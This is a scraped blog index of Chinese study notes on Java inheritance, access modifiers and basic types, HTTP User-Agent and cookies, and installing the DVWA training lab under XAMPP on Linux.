//覆盖父类的方法method(int x, int y)\nIOException{\n……\n}\n……\n}\n\n&emsp;\n覆盖的效果：当一个B类对象调用method方法时它只会使用B类的method版本，而父类A的method版本被覆盖掉了在覆盖时要注意以下几点：（1）覆盖的方法的首部必须要和被覆盖的方法的首部完全匹配，才能达到覆盖的效果；（2）覆盖的方法的返回值类型必须和被覆盖的方法的返回值类型一致；（3）覆盖的方法所抛出的异常必须和被覆盖方法的所抛出的异常一致，或者是其子类；（4）被覆盖的方法不能为private，否则在其子类中只是新定义了一个方法，并没有对其进行覆盖&emsp;2.3.3 📒方法的重载：含义：方法名相同，但参数列表不同通过方法的覆盖，能够修改对象的同名方法的具体实现体，相同的方法在各个子类中实现的版本可以不一样.&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; —&ensp;—实现多个类中多态性的基础之一重载的效果：父类A的method版本不会被覆盖掉，相当于在子类B中有两个method方法，一个来自父类，一个自己加的，它们之间的参数列表不一样.注意：（1）在使用重载时只能通过不同的参数表样式。（2）不能通过访问权限、返回类型、抛出的异常进行重载；(但是同一类里面的成员方法可以这样重载)（3）被重载的方法不能为private，否则在其子类中只是新定义了一个方法，并没有对其进行重载。特别注意：在继承机制中，不允许在子类中降低成员(包括变量和方法)的访问权限（访问权限大小关系是private &lt; 缺省 &lt; protected &lt; public）。即如果一个方法在父类中是protected的，那么在子类中要重载或覆盖该方法时，就不能把该方法改成是缺省或private，否则会出现编译错误。&emsp;习题1：分析下列程序输出结果 \n\nclass A\n{          public void PrintNumber(int a)\n           {          System.out.println(++a);\n           }            \n}\nclass B extends A\n{          public void PrintNumber(int a,int b)\n           {          System.out.println(a);\n           }  \n           public static void main(String args[])\n         {  \n                   B b=new B();\n                   b.PrintNumber(100);         \n          }   \n}\n输出结果：101\n\n&emsp;\n习题2：分析下列程序输出结果 \n\nclass A\n{          public void PrintNumber(int a)\n           {          System.out.println(++a);\n           }            \n}\nclass B extends A\n{          public void PrintNumber(int a)\n           {          System.out.println(--a);\n           }  \n           public static void main(String args[])\n         {  \n                   B b=new B();\n                   b.PrintNumber(100);         \n          }   \n}\n输出结果：99\n\n&emsp;&emsp;\n2.3.4 📒方法的添加：子类可以新加一些方法，以针对子类实现相应的功能.\n\n&emsp;&emsp;\n2.4  静态成员变量的继承(1)某类的静态成员为该类及该类的所有子类所共有；(2)如果子类中新定义的静态成员变量与父类中的某个静态成员变量同名，则这两个静态成员变量相互独立。\n\n(1)\nclass a\n{\n  public static int b=10; //静态属性\n}\nclass test extends a\n{ \n  public static void main(String args[])\n  {\n    test.b=20;\n    System.out.println(a.b);        \n  }\n}\n输出结果：20\n\n(2)\nclass living\n{\n       public static int age; //静态属性               \n}\nclass human extends living\n{ \n       public static int age; //静态属性\n       public static void main(String args[])\n        {\n               human.age=20;\n               System.out.println(living.age);\n        }   \n}\n输出结果：0\n\n&emsp;&emsp;\n2.5  super的使用super：代表父类对象，在继承中有重要的作用📒使用情况：(1)  子类隐藏了超类中的变量或方法，而在程序中又要使用超类中被隐藏的变量或方法时&emsp;&emsp;格式：super.变量 ;  super.方法([参数表])(2)  在子类的构造方法中引用超类的构造方法时&emsp;&emsp;格式： super([参数表])📒注意:  构造方法不能被继承，但是子类的构造方法能确保它的直接父类和间接父类的构造方法都被调用，但是注意一点：子类构造方法中调用父类构造方法时，调用语句必须放在子类构造方法中的第一句.&emsp;&emsp;1.  📒使用super访问父类的属性和方法&emsp;&emsp;2.  📒使用super在子类中调用父类的构造方法&emsp;3.  📒使用super的注意事项(1)通过super不仅可以访问直接父类中定义的属性和方法，还可以访问间接父类中定义的属性和方法。(2)由于它指的是父类对象，所以super不能在static环境中使用，包括类变量、类方法和static语句块。(3)使用super不能访问本类定义的属性和方法。(4)在构造方法中使用super时，super语句必须放在第一句(5)在子类的构造方法中，super可以不明确使用，也可以明确使用。\n\n&emsp;\n4.  📒明确使用super调用父类构造方法\n\nclass Point{\n    int x=0;\n    Point（int x）{\n     this.x=x;\n}\n｝\n\nclass MapPoint extends Point{\nMapPoint(){\n    super(3);  //明确使用\n　System.out.println(\"MapPoint()\");\n}\npublic static void main(String[] args){\n　　new MapPoint();\n　　}\n\n｝\n\n&emsp;&emsp;\n5.  📒不明确使用super调用父类构造方法&emsp;当父类重载自己的构造函数时，在子类的构造函数中要明确写出到底是使用父类的哪一个构造函数！！！否则编译器不知道在子类中到底是调用父类的哪一个构造方法！\n\n如下:\n\nclass Point{\n    int x=0;\n    Point（int x）{\n     this.x=x;\n}\n｝\n\nclass MapPoint extends Point{\nMapPoint(){\n　System.out.println(\"MapPoint()\");\n　　}\npublic static void main(String[] args){\n　　new MapPoint();\n　　}\n｝\n//编译会出错\n\n答案：因为子类中没有明确使用super，系统会自动在构造方法中加上super()，来调用直接父类的不带参数的构造方法，由于Point类中没有定义不带参数的构造方法，所以编译通不过。以上代码相当于：\n\nclass Point{\n    int x=0;\n    Point（int x）{\n     this.x=x;\n}\n｝\n\nclass MapPoint extends Point{\nMapPoint(){\n　super(); //此处不能缺省\n　System.out.println(\"MapPoint()\");\n　　}\npublic static void main(String[] args){\n　　new MapPoint();\n　　}\n}\n\n&emsp;解决方法：(1)在MapPoint的构造方法中，明确使用super来调用父类已有的构造方法，如super(3);(2)在Point中加入一个不带参数的构造方法，如Point{} 　　　　　(3)去掉Point中全部的构造方法，则编译器会自动加入一个不带参数的构造方法，称为缺省构造方法。\n&emsp;6.  📒构造方法的调用顺序\n一个复杂对象的构造方法调用顺序如下：\n\n(1)首先调用父类的构造方法。这个步骤会反复递归，使继承阶层的根源最先被构建，然后是次一层的子类，直至最末一层子类为止；（即先调用最根部的父类，然后依次调用该父类的子类的子类的……..）(2)根据各个成员的声明顺序，执行成员变量的初始化赋值；(3)执行该构造方法中的各语句\n&emsp;&emsp;\n三、 抽象类与抽象方法abstract类似于它是一个模板！！！\n\n(1)abstract关键字修饰的类和方法(2)抽象类不能创建任何对象，抽象类必须产生其子类，由子类创建对象。(3)抽象类中可以包含抽象方法，也可以不包含抽象方法，但如果类中的某一方法是抽象的，整个类就必须被说    明成抽象的。(4)抽象方法在子类中必须被实现，否则子类仍是抽象的。(5)抽象类不是可有可无的。(6)(类、成员方法、成员属性)访问权限修饰符为abstract。\n\n[例4-17]  抽象类举例\nabstract class Shape \n{  abstract  double  area(); \n    abstract void draw(); }                                         \n //上述方法对一般图形无法定义其实现\nclass Rectangle  extends Shape  {\nint width;                        \n       int length;                       \npublic double area() {\n//矩型类实现了Shape类的抽象方法area()\n   return width*length;\n}\npublic void draw () {  … …     \n//矩型类实现了Shape类的抽象方法draw()，详细可由自己完成} \n}\n\n&emsp;&emsp;\n四、 final类和final方法 4.1  final类如果一个类被final修饰符所修饰和限定，说明这个类不能被继承，即不可能有子类——最终类             例如：java.lang.System📒作用：final修饰符通常是出于安全的目的而使用的，因为不能继承final类，人们就不能重载或覆盖它的任何方法。如果允许一个类被继承，其允许被重载或覆盖的方法可能会被改写。保证某个特定的方法在类层次关系上的某层以后只有一个定义，这对于那些安全性非常关键的类是非常必要的。\n\n&emsp;&emsp;\n4.2  final方法final修饰符所修饰的方法，是不能被子类所覆盖的方法。📒作用：固定了这个方法所对应的具体操作，可以防止子类对父类关键            方法的错误的重定义，保证了程序的安全性和正确性。📒注意：所有已被private修饰符限定为私有的方法，以及所有包含在final类中的方法，都被默认为是            final的。            因为这些方法不可能被子类所继承，所以不可能被重载，自然都是最终的方法。\n\n&emsp;&emsp;&emsp;&emsp;\n","thumbnail":"https://i.loli.net/2018/12/25/5c21082154dab.jpg","plink":"https://Directoree.github.io/post/Java-Inherit-4/"},{"title":"对称密码-序列密码","date":"2018-12-24T07:59:25.000Z","updated":"2018-12-28T01:43:12.800Z","content":"&emsp;&emsp;&emsp;\n序列密码\n\n一、 序列密码分类\n\n\n\n&emsp;&emsp;\n1.1  同步序列密码\n&emsp;&emsp;\n1.2  自同步序列密码\n&emsp;&emsp;\n二、 密钥流与密钥生成器\n","thumbnail":"https://s1.ax1x.com/2018/12/24/F62ftf.png","plink":"https://Directoree.github.io/post/Sequence-Password/"},{"title":"对称密码-分组密码","date":"2018-12-24T05:19:38.000Z","updated":"2019-01-06T10:25:24.240Z","content":"&ensp;&ensp;\nDES、AES、IDEA、SMS4&ensp;&ensp;\n一、 DES1.1  DES加密算法过程&ensp;&ensp;\n1.2  DES子密钥生成过程\n&ensp;&ensp;\n二、 AES2.1  AES加密算法过程\n&ensp;&ensp;\n2.2  AES子密钥生成过程\n&ensp;&ensp;\n三、 IDEA3.1  IDEA加密算法与子密钥生成\n&ensp;&ensp;\n四、 SMS44.1  SMS4加密算法与子密钥生成\n&ensp;&ensp;&ensp;&ensp;\n","thumbnail":"https://s1.ax1x.com/2018/12/24/F62ftf.png","plink":"https://Directoree.github.io/post/Block-Cipher/"},{"title":"Java类、成员变量、static访问权限(4.1-4.4)","date":"2018-12-23T15:46:18.000Z","updated":"2018-12-26T08:40:37.694Z","content":"&ensp;&ensp;\n一、 Java中类的定义、类访问权限1.1  类的定义格式：[修饰符] class 类名 [extends父类名] [implements接口名列表]&emsp;&emsp;\n&emsp;\n1.2  类修饰符的访问权限：\n\n\n类修饰符\n访问权限  \n\n\n\n\n缺省(默认方式)\n这种类只能被同一个包中的类访问；\n\n\npublic(公共)\n它修饰的类能被所有的类访问；\n\n\nabstract(抽象)\n 它修饰的类不能被实例化，它可能包含有未实现的方法。\n\n\nextends(继承)\n该保留字用来表明新创建的类继承哪个类, 被继承的类称为此类的父类。extends后面只能跟一个父类名称, 因为Java中一个类最多能继承一个类(单继承)。\n\n\nfinal(最终)\n 它修饰的类不能被继承，即不能有子类。\n\n\nimplements (实现)\n该保留字用来表明这个类实现了哪些接口，接口名可以有多个。\n\n\n\n&emsp;\n1.3  关于类访问权限的总结：1.    具有继承关系的子类可以继承父类的一些成员变量，即可以不创建对象就可以直接访问，如果是      同一个包的子类可以继承到public、缺省和protected修饰的变量，如果是不同的包的子类就只能继承      到public 和protected的；2.    如果是其他类，不管是一个包还是不在一个包，都要创建该类的对象才能引用3.    如果是main方法，不管是本类还是非本类，要访问实例变量都要创建对象，可以引申到其他所有       的类方法中4.    私有成员只能在本类中访问，如果在main方法中访问私有成员 必须创建对象\n\n&ensp;&ensp;\n二、 成员变量访问权限&ensp;\n&ensp;&emsp;\n2.1  成员变量访问权限总结为：(1) 访问修饰符缺省访问修饰符缺省时，成员变量只能被同一包(package) 中的所有类访问，所以也称为包(package)变量。(缺省访问修饰符实际是friendly修饰符，但因为friendly不是Java语言的关键字，所以friendly修饰符不能显式说明。）(2) public(公共)public修饰的成员变量可以被程序中的任何类所访问。由于public成员变量不受限制, 这易使类的对象引起不希望的修改，建议成员变量尽量不要使用public修饰符。(3) protected (受保护)protected修饰的成员变量可以被本包及有继承关系的类自由访问。(4) private (私有)private修饰的成员变量只能在同一个类中使用。这种方式通常是最为安全的。\n\n&ensp;&ensp;\n三、 static(静态)——静态变量访问权限(1)static修饰的成员变量称为类变量(静态变量)；不用static修饰的成员变量又叫对象变量(实例变量)。(2)区别：对象变量依附于具体的对象实例，它的值因具体对象实例的不同而不同，而类变量为该类的所有对象所共享，它的值不因类的对象不同而不同。(3)可以通过类来访问静态成员变量，也可以通过该类的对象访问静态成员变量。&ensp;&ensp;形式：类名.成员变量/对象名.成员变量(4)反过来，非staic的对象方法可以直接使用static的类变量(5)类方法不能直接调用类中的对象方法（非static方法）。(6)定义变量时必须当即赋值。\n\n&emsp;&emsp;&emsp;&emsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d0912e97e.jpg","plink":"https://Directoree.github.io/post/Java-Access-Permissions-3/"},{"title":"Java语言基础的字符常变量等(3.1-3.3)","date":"2018-12-20T08:48:59.000Z","updated":"2019-01-19T08:37:17.099Z","content":"&ensp;&ensp;\n标识符,注释和分隔符、变量和常量、基本类型&ensp;&ensp;\n一、 标识符、注释和分隔符📒标识符：是程序员用来标记语言中元素（变量、常量、类、对象等）名称的命名记号。\nJava中的标识符遵守先定义后使用的原则。即只有定义了的标识符，才可在语句部分使用。\n\nJava定义标识符的规则：(1)由字母、 数字、下划线、$组成，不能由数字开头(2)不能是Java中的保留字(关键字)；(3)大小写敏感，长度无限制。\n&emsp;\n\n\n\n类型\n保留字  \n\n\n\n\n类型保留字\n boolean, byte, char, short,  int, long,float, double, void\n\n\n语句保留字\n if, else, switch, case, default, break, for, while, do,return,continue,try,catch,finally,throw,synchronized\n\n\n表达式保留字\n new, null, this, super\n\n\n修饰符保留字\n abstract, final, public, private, protected, static, transient, volatile \n\n\n类、方法保留字\n class, throws, native, instanceof\n\n\n扩展类构筑模块保留字\n package, import, extends, implements, interface \n\n\n其它保留字\n cast, futuer, generic, inner, oprater, outer, rest,var \n\n\n\n&emsp;&emsp;\n1.1  标识符举例：合法标识符：     A , a1,  $Systembol,  square,  ex_sa不合法标识符：          1a          （以数字1开头）                       break       （禁止使用保留字）                       TWO  WORDS  （含有空格）                       .NO         （有圆点）\n\n\n&emsp;\n1.2  注释Java有三种注释形式：      1.“//” 单行注释。表示从此向后，直到行尾都是注释。      2.“/*……*/“ 块注释。在“/*”和“*/”之间都是注释。      3.“/**……*/”文档注释。所有在“/**”和“*/”之间的内容可以用来自动形成文档。\n\n\n&emsp;\n1.3  语句与C++一样，Java中的语句也是最小的执行单位。&emsp;&emsp;&emsp;&emsp;各个语句之间以  ;  间隔&emsp;&emsp;&emsp;&emsp;X大括号{   }内的一系列语句称为语句块\n\n\n\n&emsp;&emsp;\n 二、 变量和常量2.1  变量📒Java的变量有两种：局部变量  类成员变量变量必须先定义后使用！变量的定义形式如下：&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;类型      变量名表；\n\n\n注意：局部变量在使用前必须给定初值，否则，将编译出错，而类成员变量无此要求。\n\n如下出现编译错误，缺少“y=8;”\nclass test{\n  int x;\n  void method(){\n      int y; \n      System.out.println(x)\n      System.out.println(y);}\n  public static void main(String[] args){\n       test t=new test();\n       t.method();}\n}\n\n&emsp;\n2.1.1  变量名 1. 📒在Java中用标识符来表示变量名。&emsp;&emsp;1.1 变量名中字母大写和小写是有区别的，如name和Name表示两个不同的变量名；&emsp;&emsp;1.2 变量名标志存放变量值的内存位置，其内存存放的内容是变量的值。2. 📒命名方法:2.1 程序员应该为变量取有意义的名称，以利于程序的阅读和理解；2.2 习惯上，变量名以小写字母开头，若一个变量名由超过一个单词所组成，则第一个单词之后的所有单词都以大写字母开头，以便于理解该变量名。&emsp;&emsp;例如，anIntVar\n\n&emsp;\n2.1.2   变量的类型 变量类型用于表述数据的格式和结构。📒Java中的数据类型可分为两大类：基本数据类型：整数类型、实数类型、字符型、布尔型构造数据类型：Java 语言中构造类型用类来描述。\n\n\n\n&emsp;&emsp;\n 三、 基本数据类型表:变量和常量\n&emsp;\n3.1  整型\n&emsp;\n3.1.1  整型常量\n&emsp;\n3.1.2  整型变量\n&emsp;\n3.2  实型\n&emsp;\n3.2.1实型常量有两种表示法：(1)十进制表示法&emsp;&emsp;-3.5f&emsp;0.0f&emsp;123.45f&emsp;+678.9f      要注意,采用十进制表示法时,小数点的两侧都必须有数字, 缺一不可，如+123．和 .56都是不合法的。(2)科学表示法： &lt;尾数&gt; E &lt;阶码 &gt; &emsp;&emsp;-1.234567E+12&emsp;(-1.2345678901×1012)&emsp;&emsp;尾数&emsp;阶码注意：&emsp;&emsp;&emsp;&emsp;尾数必须有，但小数部分可无；&emsp;&emsp;&emsp;&emsp;阶码必须有，必须是整数。&emsp;&emsp;&emsp;&emsp;基数是10下列表示都是不正确的。&emsp;&emsp;E-6&emsp;&emsp;（缺尾数）&emsp;&emsp;3E&emsp;&emsp;（无阶码）&emsp;&emsp;2.E3&emsp;&emsp;（尾数出错）&emsp;&emsp;2E1.2&emsp;&emsp;（阶码非整数）&emsp;📒实型变量的定义例如：float aFloatVar;double aDoubleVar;\n\n&emsp;\n3.3      布尔型📒布尔数据类型用于表达逻辑状态：&emsp;&emsp;布尔型数据只有两个值：true和false。&emsp;&emsp;注意: Java中不可将布尔类型看做整型值。true不对应1，false不对应0，不像C++一样。\n\n&emsp;\n3.4      字符型📒字符类型用来表示单个字符，采用16位二进制Unicode 编码表示字符常量是用两个单引号括起来的一个字符&emsp;&emsp;例如： ‘A’；  ‘a’； ‘2’； ‘我’；也可用unicode代码表示一个字符常量&emsp;&emsp;例如： ‘\\u0041’    \n\n&emsp;&emsp;\n 四、 Unicode编码📒Unicode编码：1. Java的字符使用Unicode编码，使用两个字节(16位)，所以它几乎包括所有字符，中文、日文、…，它支持世   界上所有语言。2. 大多数语言使用ASCII码，用8位表示一个字符。ASCII码是Unicode码的一个子集，Unicode表示ASCII   码时，其高位为0，它是其前255个字符。Unicode字符通常用十六进制。例如“\\u0000”-“\\u00ff”表示   ASCII码集。”\\u”表示转义字符，它用来表示其后四个十六进制数字是Unicode代码。 \n\n&emsp;&emsp;&emsp;&emsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d0d7b3249.jpg","plink":"https://Directoree.github.io/post/Java-Language-2-1/"},{"title":"《HTTP协议请求头部的User-Agen和Cookie》","date":"2018-12-18T07:07:00.000Z","updated":"2018-12-24T12:26:08.763Z","content":"&ensp;\n一、User-Agen注意在HTTP头部参数的首字母大写格式！\n🌸1.1 什么是User-Agen1.1.1、 Http Header之User-Agen的User-Agen中文名为用户代理，是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。它是一个特殊字符串头，是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。通过这个标识，用户所访问的网站可以显示不同的排版从而为用户提供更好的体验或者进行信息统计；例如用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的UA来判断的。UA可以进行伪装。浏览器的UA字串的标准格式：浏览器标识 (操作系统标识; 加密等级标识; 浏览器语言)渲染引擎标识版本信息。但各个浏览器有所不同。1.1.2、用较为普通的一点来说，是一种向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。UA字符串在每次浏览器 HTTP 请求时发送到服务器！User-Agen也是用户识别的重要部分，通过分析，能知道用户使用的是什么设备、什么浏览器、什么应用等，进而可以分析其购买力、属性、职业等。\n\n\n&ensp;\n🌸1.2 对UA字串的说明1.2.1 &emsp;出于兼容及推广等目的，很多浏览器的标识相同，因此浏览器标识并不能说明浏览器的真实版本，真实版本信息在 UA 字串尾部可以找到。\n\n\n\n1.2.2 操作系统标识\n\n\n\n1.2.3 加密等级标识&emsp;N: 表示无安全加密&emsp;I: 表示弱安全加密&emsp;U: 表示强安全加密\n\n\n\n1.2.4 浏览器语言&emsp;在首选项 &gt; 常规 &gt; 语言中指定的语言\n\n\n\n1.2.5 渲染引擎&emsp;显示浏览器使用的主流渲染引擎有：Gecko、WebKit、KHTML、Presto、Trident、Tasman等，格式为：渲染引擎/版本信息\n\n\n\n1.2.6 版本信息&emsp;显示浏览器的真实版本信息，格式为：浏览器/版本信息注：1、在广告定向设定中，浏览器定向和操作系统定向均是针对User-Agent中的信息进行定向。2、欲了解更多的User-Agent信息，请参考User-Agen 字串史\n\n\n\n&ensp;\n🌸1.3 User-Agen的作用通过user-agent不能完全准确的判断是属于那款浏览器。由于UA字符串在每次浏览器HTTP 请求时发送到服务器，所以服务器就可以根据它来做好多事。比如：1、统计用户浏览器使用情况。有些浏览器说被多少人使用了，实际上就可以通过判断每个IP的UA来确定这个IP是用什么浏览器访问的，以得到使用量的数据。2、根据用户使用浏览器的不同，显示不同的排版从而为用户提供更好的体验。有些网站会根据这个来调整打开网站的类型,如是手机的就打开wap，显示非手机的就打开pc常规页面。用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的UA来判断的。既然知道了UA的作用，那么其实客户端也可以使用UA来做一些神奇的事。比如：伪装 User-Agen 来回避某些侦测特定浏览器才能读取的网站。如果使用Firefox浏览器插件User-Agen switcher，用户就可以轻松地在不同UA之间切换，把自己伪装成其他浏览器。这样就可以在PC上预览WAP或移动格式的网页，比如专门为iPhone设计的页面。\n\n&ensp;\n二、Cookie——用户追踪之基础技术2.1 关于Cookie2.1.1 前言 &emsp;Cookie是如此的重要，以至于我们后面要讲到的回头客定向、访客频次定向、用户定向等等都需要基于此技术才可以实现，并且我们日常工作中所能见到的第三方监测工具如doubleclick、99click、秒针等也都要利用cookie技术，网站分析工具如GA、百度统计、CNZZ等也需要利用Cookie。如果没有Cookie，互联网广告市场将受到巨大打击，尤其对于目前我们谈论的精准广告而言。如果没有Cookie，网站分析也不从做起，遑论优化了。\n\n\n\n2.1.2 Cookie是什么 &emsp;Cookie在英文中是小甜品的意思，但在计算机语言中，Cookie指的是当你浏览某网站时，网站存储在你电脑上的一个小文本文件，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。它记录了你的用户ID，密码、浏览过的网页、停留的时间等信息，用于用户身份的辨别。Cookie通常是以user@domain格式命名的，user是你的本地用户名，domain是所访问的网站的域名。\n\n\n\n2.1.3 为什么要Cookie &emsp;因为HTTP协议是无状态的，对于一个浏览器发出的请求，服务器无法区分是不是同一个来源，无法知道上一次用户做了什么。所以，需要额外的数据用于维护会话。 Cookie 正是这样的一段随HTTP请求一起被传递的额外数据，用于维护浏览器和服务器的会话。我们可以想象一个场景，你没有登录京东时在京东上购物，选择了3件商品放入购物车，在结算时，京东为什么还能知道这三件商品是什么？没错，是Cookie！\n\n\n\n2.1.4 Cookie的工作原理 &emsp;Cookie利用网页代码中的HTTP头信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。例如：当你在浏览器地址栏中键入了Amazon的URL，浏览器会向Amazon发送一个读取网页的请求，并将结果在显示器上显示。在发送之前，该网页在你的电脑上寻找Amazon网站设置的Cookie文件，如果找到，浏览器会把Cookie文件中的数据连同前面输入的URL一同发送到Amazon服务器。服务器收到Cookie数据，就会在他的数据库中检索你的ID，你的购物记录、个人喜好等信息，并记录下新的内容，增加到数据库和Cookie文件中去。如果没有检测到Cookie或者你的Cookie信息与数据库中的信息不符合，则说明你是第一次浏览该网站，服务器的CGI程序将为你创建新的ID信息，并保存到数据库中。（此例子来源于百度百科——Cookie）\n\n\n\n2.1.5 关于Cookie的一些知识点 &emsp;1、Cookie是基于浏览器的，因此当电脑上安装多个浏览器时，服务器会生成多个Cookie。虽然是同一个人，但服务器是识别为多个用户。&emsp;2、Cookie是基于浏览器的，因此当同一台电脑有多个人使用时，服务器也只会生成一个Cookie。虽然是多个人，但服务器会认为是一个用户。&emsp;3、Cookie是无法跨设备进行设置的。比如我们在单位和家里分别使用两台电脑，即使我们使用同一种同一版本的浏览器，我们还是生成了两个Cookie，服务器会认为是两个用户。（PS：现在有些浏览器可以同步数据，比如Chrome、Friefox，可以避免这种问题）请注意：以上所说的Cooke指的全部是Http Cookie。有一种Cookie——Flash Cookie，可以解决多浏览器的问题\n\n\n\n2.1.6 关于Flash Cookie &emsp;FlashCookie是由FlashPlayer控制的客户端共享存储技术，鉴于目前Flash技术的普遍性，几乎所有的网站都采用，所以具有同Http Cookie一样的作用。在技术上，通过使用JavaScript与ActionScript可以将Http Cookie和Flash Cookie进行互通。Flash cookie的优势在于：1、跨浏览器不管用户的计算机上安装了多少个浏览器或者浏览器的不同版本，使用Flash Cookie能够使所有的浏览器共用一个Cookie。2、不易删除所有的浏览器均提供了清除Http Cookie的快捷方式，但Flash Cookie并没有此种方式，并且其保存位置非常隐蔽，网民难以删除。3、容量更大Flash Cookie可以容纳最多100千字节的数据，而一个标准的HTTP Cookie只有4千字节。\n\n\n\n2.1.7 Cookie的数量 &emsp;1、大多数浏览器支持最大为 4096 字节的 Cookie。因此最好用 Cookie 来存储用户 ID 之类的标识符，用户的详细信息则通过用户 ID从数据库或其他数据源中读取。&emsp;2、浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；当存储更多 Cookie时，最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie 总数作出绝对限制，通常为 300 个。 \n\n\n\n2.1.8 Cookie的失效时间 &emsp;1、浏览器的Cookie设置会决定是否保存Cookie数据。如果浏览器不允许Cookie保存，则关掉浏览器后，这些数据就消失。&emsp;2、如果浏览器允许保存Cookie，那么Cookie的时间由服务器的设置决定。Cookie有一个Expires（有效期）属性，这个属性决定了Cookie的保存时间，服务器可以通过设定Expires字段的数值，来改变Cookie的保存时间。如果不设置该属性，那么Cookie只在浏览网页期间有效，关闭浏览器，这些Cookie自动消失，绝大多数网站属于这种情况。通常情况下，Cookie包含Server、Expires、Name、value这几个字段，其中对服务器有用的只是Name和value字段，Expires等字段的内容仅仅是为了告诉浏览器如何处理这些Cookies。 \n\n\n\n参考：《【总结】浏览器 User-Agent 大全》、《User-Agent详解》.&ensp;&ensp;&ensp;&ensp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d05c80016.jpg","plink":"https://Directoree.github.io/post/HTTP-User-Agen-Cookie/"},{"title":"XAMPP环境下配置DVWA","date":"2018-12-15T16:04:45.000Z","updated":"2018-12-24T12:31:56.024Z","content":"一、下载1. 下载XAMPP    2. 下载DVWA  \n\n&nbsp;\n二、给文件执行权限并安装XAMPP1. 在“下载”目录下，以“客户端运行” \n\nsudo chmod a+x xampp-linux-x64-5.6.12-0-installer.run\n\n2. 在“下载”目录下，运行安装 \n\nsudo ./xampp-linux-x64-5.6.12-0-installer.run\n\n&nbsp;\n三、数据库配置1. 在浏览器中访问127.0.0.1；2. 点击右上角phpmyadmin -&gt; new(新建) -&gt;user(用户) -&gt;add user(添加用户)并填写下面内容： \n\n\n用户名:dvwa主机名:127.0.0.1密码一:dvwa重复密码:dvwa\n\n下面除了require ssl全部都勾选3. go(执行) \n\n&nbsp;\n四、移动DVWA文件、更名、提权1. 移动更名：将DVWA-master移动到/opt/lampp/htdocs下并且重命名为dvwa；2. 提权：然后给文件夹高权限否则网页打不开127.0.0.1/dvwa/\n\nchmod -R 755 /opt/lampp/htdocs/dvwa\n\n&nbsp;\n五、更改dvwa配置的文件名和内容1. 将/opt/lampp/htdocs/DVWA-master/config/connfig.inc.php.dist改为/opt/lampp/htdocs/DVWA-master/config/config.inc.php2. 原内容：\n\n$_DVWA = array();\n$_DVWA[ 'db_server' ]   = '127.0.0.1';\n$_DVWA[ 'db_database' ] = 'dvwa';\n$_DVWA[ 'db_user' ]     = 'root';\n$_DVWA[ 'db_password' ] = 'p@ssw0rd';\n\n更改为：\n\n$_DVWA = array();\n$_DVWA[ 'db_server' ] = '127.0.0.1';\n$_DVWA[ 'db_database' ] = 'dvwa';\n$_DVWA[ 'db_user' ] = 'dvwa';\n$_DVWA[ 'db_password' ] = 'dvwa';\n\n&nbsp;\n六、创建数据库并重新登陆1. 浏览器输入127.0.0.1/dvwa/，输入账号：dvwa    密码：dvwa &emsp;进去之后根据提示创建数据库；2. 数据库创建好之后会自动跳到登陆界面，重新登陆，输入用户名admin和密码password就可以用了😄😁….\n\n&ensp;&ensp;&ensp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d1ab47ce1.jpg","plink":"https://Directoree.github.io/post/XAMPP-DVWA/"},{"title":"Java的输入输出","date":"2018-12-13T17:00:39.000Z","updated":"2019-01-08T11:36:33.274Z","content":"一、Java中的流的概念1.0 数据流的概念\n\n&emsp;数据流是一串连续不断的数据的集合，就象水管里的水流，在水管的一端一点一点地供水，而在水管的另一端看到的是一股连续不断的水流。数据写入程序可以是一段、一段地向数据流管道中写入数据，这些数据段会按先后顺序形成一个长的数据流。对数据读取程序来说，看不到数据流在写入时的分段情况，每次可以读取其中的任意长度的数据，但只能先读取前面的数据后，再读取后面的数据。不管写入时是将数据分多次写入，还是作为一个整体一次写入，读取时的效果都是完全一样的。&emsp;“流是磁盘或其它外围设备中存储的数据的源点或终点。”在电脑上的数据有三种存储方式，一种是外存，一种是内存，一种是缓存。比如电脑上的硬盘，磁盘，U盘等都是外存，在电脑上有内存条，缓存是在CPU里面的。外存的存储量最大，其次是内存，最后是缓存，但是外存的数据的读取最慢，其次是内存，缓存最快。这里总结从外存读取数据到内存以及将数据从内存写到外存中。对于内存和外存的理解，我们可以简单的理解为容器，即外存是一个容器，内存又是另外一个容器。那又怎样把放在外存这个容器内的数据读取到内存这个容器以及怎么把内存这个容器里的数据存到外存中呢？&emsp;在Java类库中，IO部分的内容是很庞大的，因为它涉及的领域很广泛:标准输入输出，文件的操作，网络上的数据流，字符串流，对象流，zip文件流等等，java中将输入输出抽象称为流，就好像水管，将两个容器连接起来。将数据冲外存中读取到内存中的称为输入流，将数据从内存写入外存中的称为输出流。流是一个很形象的概念，当程序需要读取数据的时候，就会开启一个通向数据源的流，这个数据源可以是文件，内存，或是网络连接。类似的，当程序需要写入数据的时候，就会开启一个通向目的地的流。\n\n\n  以上总结的基本概念如下：\n🌸数据流：一组有序，有起点和终点的字节的数据序列。包括输入流和输出流;🌸输入流(Input  Stream)：程序从输入流读取数据源。数据源包括外界(键盘、文件、网络…)，即是将数据源读入到程序的通信通道;🌸输出流：程序向输出流写入数据。将程序中的数据输出到外界（显示器、打印机、文件、网络…）的通信通道。采用数据流的目的就是使得输出输入独立于设备。Input  Stream不关心数据源来自何种设备（键盘，文件，网络）Output  Stream不关心数据的目的是何种设备（键盘，文件，网络）🌸数据流分类：流序列中的数据既可以是未经加工的原始二进制数据，也可以是经一定编码处理后符合某种格式规定的特定数据。因此Java中的流分为两种： 1)  字节流：数据流中最小的数据单元是字节； 2)  字符流：数据流中最小的数据单元是字符，Java中的字符是Unicode编码，一个字符占用两个字节。🌸具体的字节流和字符流区分请看文章《Java:字节流和字符流（输入流和输出流）》和《Java 